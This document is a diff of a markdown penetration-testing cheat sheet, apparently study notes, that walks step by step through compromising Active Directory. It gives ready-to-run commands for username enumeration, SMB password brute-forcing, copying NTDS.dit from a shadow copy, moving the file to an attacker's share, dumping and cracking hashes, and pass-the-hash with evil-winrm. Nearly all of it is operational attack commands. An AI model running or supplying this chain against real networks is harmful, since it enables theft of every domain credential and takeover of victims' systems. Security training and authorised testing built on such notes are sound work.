@@ -1,96 +1,160 @@
-### Active Directory Enumeration and NTDS.dit Attacks
+## Username List Generation
 
-#### 1. Username Enumeration and OSINT
+When to use: Foothold established, need target-specific lists based on public names or email structures,.
 
-**When to use:** Before launching password attacks to identify valid **naming conventions** and confirm active accounts to reduce noise and avoid unnecessary lockout risks.
+Generate permutations from a list of real names
 
-**Operational Workflow:**
+```
+./username-anarchy -i <FILE_PATH>
+```
 
-1. **Identify Naming Conventions:** Research employee names via social media or company websites. Common patterns include `firstinitiallastname` or `firstname.lastname`.
-2. **Analyze Email Structures:** Infer usernames from email formats (e.g., `jdoe@<DOMAIN>` suggests `<USERNAME>` is `jdoe`).
-3. **Generate Username Lists:** Use tools to automate the creation of potential username combinations based on identified patterns.
-4. **Validate Usernames:** Perform enumeration against the Domain Controller to confirm which generated names are valid.
-
-**Command Reference:**
-
-|Tool|Purpose|Command|
-|:--|:--|:--|
-|**Username Anarchy**|Convert real names into common username formats|`./username-anarchy -i names.txt`|
-|**Kerbrute**|Enumerate valid users via Kerberos without locking accounts|`./kerbrute_linux_amd64 userenum --dc <TARGET_IP> --domain <DOMAIN> usernames.txt`|
+- Tool comparison
+    
+    - Manual generation → Infer structure from email (e.g., `<USERNAME>@<DOMAIN>`) or PDF metadata → Use when automated tools fail to match a specific obfuscated pattern,
+    - Username Anarchy → `./username-anarchy -i <FILE_PATH>` → Use to rapidly create a large volume of common naming convention combinations,
+- Gotchas
+    
+    - **Noisy over network**, large-scale guessing generates high traffic and target system alerts.
 
 ---
 
-#### 2. Active Directory Password Attacks
+## Username Enumeration
 
-**When to use:** Once a list of valid usernames is obtained and a **foothold** on the internal network is established.
+When to use: Need to identify the correct naming convention and confirm account validity before attempting password attacks.
 
-**Scenario Context:**
+Identify valid AD accounts via Kerberos
 
-- **Brute-Force:** Target a specific user with a wordlist. Use when no account lockout policy is enforced (often the default in older or misconfigured environments).
-- **Implications:** These attacks are **noisy** and generate significant network traffic and security alerts (Event ID 4776).
+```
+./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <DOMAIN> <FILE_PATH>
+```
 
-**Operational Workflow:**
-
-1. **Launch SMB Brute-Force:** Attempt to authenticate against the Domain Controller using a list of common passwords.
-
-**Command Reference:**
-
-|Tool|Purpose|Command|
-|:--|:--|:--|
-|**NetExec (SMB)**|Password spraying or brute-forcing via SMB|`netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD_LIST>`|
+- Gotchas
+    - **Missing naming convention**, spending time discovering the exact convention reduces the need for guessing.
 
 ---
 
-#### 3. NTDS.dit Extraction (Manual Method)
+## Password Brute-Force
 
-**When to use:** After obtaining credentials for an account with **Local Administrator** or **Domain Administrator** privileges. **Why it matters:** Capturing `NTDS.dit` allows for the extraction of **all domain username hashes**, potentially compromising every account in the domain.
+When to use: Valid usernames confirmed, testing common password lists via SMB.
 
-**Operational Workflow:**
+Test password list against a single confirmed user
 
-1. **Establish Remote Session:** Connect to the Domain Controller.
-2. **Verify Privileges:** Confirm the compromised user is in the "Administrators" or "Domain Admins" group.
-3. **Create Volume Shadow Copy (VSS):** Since `NTDS.dit` is actively used by the system, a shadow copy is required to bypass file locks.
-4. **Exfiltrate Files:** Copy `NTDS.dit` and the `SYSTEM` hive (which contains the decryption key) to the attack machine.
-5. **Dump Hashes:** Use offline tools to decrypt and extract the hashes.
+```
+netexec smb <DC_IP> -u <USERNAME> -p <FILE_PATH>
+```
 
-**Command Reference:**
-
-|Action|Command|
-|:--|:--|
-|**Connect to DC**|`evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>`|
-|**Check Local Groups**|`net localgroup`|
-|**Check User Privs**|`net user <USERNAME>`|
-|**Create VSS**|`vssadmin CREATE SHADOW /For=C:`|
-|**Copy NTDS.dit**|`cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`|
-|**Move to Attack Host**|`cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACK_IP>\<SHARE_NAME>`|
-|**Offline Hash Dump**|`impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`|
+- Dangerous / misconfigured settings
+    
+    - Default Group Policy: Account lockout policies are not enforced by default in many environments.
+- Gotchas
+    
+    - **Account lockout**, verify if a lockout policy is enforced via GPO before launching high-volume attacks.
 
 ---
 
-#### 4. NTDS.dit Extraction (Automated Method)
+## Remote Access and Privilege Verification
 
-**When to use:** When a faster, more streamlined approach is preferred to dump hashes directly within a terminal session.
+When to use: Valid credentials obtained, need to establish a session and check for administrative rights,.
 
-**Command Reference:**
+Establish PowerShell session via WinRM
 
-|Tool|Purpose|Command|
-|:--|:--|:--|
-|**NetExec (ntdsutil)**|Automates VSS creation and hash dumping in one step|`netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M ntdsutil`|
+```
+evil-winrm -i <DC_IP> -u <USERNAME> -p '<PASSWORD>'
+```
+
+Check for local administrative rights
+
+```
+net localgroup
+```
+
+Check for domain-level privileges
+
+```
+net user <USERNAME>
+```
+
+- Gotchas
+    - **Insufficient privileges**, local or domain administrator rights are mandatory for copying NTDS.dit,.
 
 ---
 
-#### 5. Post-Exploitation: Hash Analysis
+## Manual NTDS.dit Extraction
 
-**When to use:** After successfully dumping hashes from the NTDS database.
+When to use: Admin rights confirmed, need to bypass file locks on the active AD database,.
 
-**Technique Selection:**
+1. Create a Volume Shadow Copy of the system drive
 
-- **Cracking:** Use when cleartext passwords are required for further manual logins.
-- **Pass-the-Hash (PtH):** Use for **lateral movement** when cracking is unsuccessful. This leverages the NTLM protocol to authenticate using the hash directly.
+```
+vssadmin CREATE SHADOW /For=C:
+```
 
-**Command Reference:**
+2. Copy the database from the shadow volume to a staging area
 
-| Tool                 | Purpose                                         | Command                                               |
-| :------------------- | :---------------------------------------------- | :---------------------------------------------------- |
-| **Hashcat**          | Crack NTLM hashes (Mode 1000)                   | `sudo hashcat -m 1000 <HASH> <WORDLIST>`              |
-| **Evil-WinRM (PtH)** | Authenticate using a hash instead of a password | `evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTHASH>` |
+```
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\NTDS\NTDS.dit <FILE_PATH>
+```
+
+3. Move the file to an attack host share
+
+```
+cmd.exe /c move <FILE_PATH> \\<ATTACK_IP>\<SHARE_NAME>
+```
+
+> ⚠️ Gap: The source does not provide the command for setting up the SMB share on the attack host, which is required for the `move` command to succeed.
+
+- Edge cases
+    
+    - Non-default NTDS location: Database may be stored on a volume other than C:, requiring `vssadmin` to target the specific drive letter.
+- Gotchas
+    
+    - **Encrypted hashes**, you must also capture the SYSTEM hive to extract keys required for decryption.
+
+---
+
+## Automated NTDS Extraction
+
+When to use: Requirement for a fast, single-command capture and dump of the NTDS database.
+
+Dump NTDS contents via VSS and ntdsutil
+
+```
+netexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M ntdsutil
+```
+
+- Tool comparison
+    - Manual VSS → `vssadmin` + `copy` → Prefer when specific file movement or stealth is required.
+    - NetExec ntdsutil → `-M ntdsutil` → Prefer for speed; automates capture, transfer, and cleanup,.
+
+---
+
+## Credential Extraction and Cracking
+
+When to use: NTDS.dit and SYSTEM hive files have been successfully exfiltrated to the attack host.
+
+Extract domain hashes from local files
+
+```
+impacket-secretsdump -ntds <FILE_PATH> -system <FILE_PATH> LOCAL
+```
+
+Attempt to crack recovered NT hashes
+
+```
+sudo hashcat -m 1000 <HASH> <FILE_PATH>
+```
+
+---
+
+## Pass-the-Hash
+
+When to use: NT hashes obtained but remain uncrackable, lateral movement or remote access is still required.
+
+Authenticate using a hash instead of a cleartext password
+
+```
+evil-winrm -i <DC_IP> -u <USERNAME> -H <HASH>
+```
+
+- Gotchas
+    - **NTLM reliance**, the attack specifically exploits the NTLM authentication protocol.
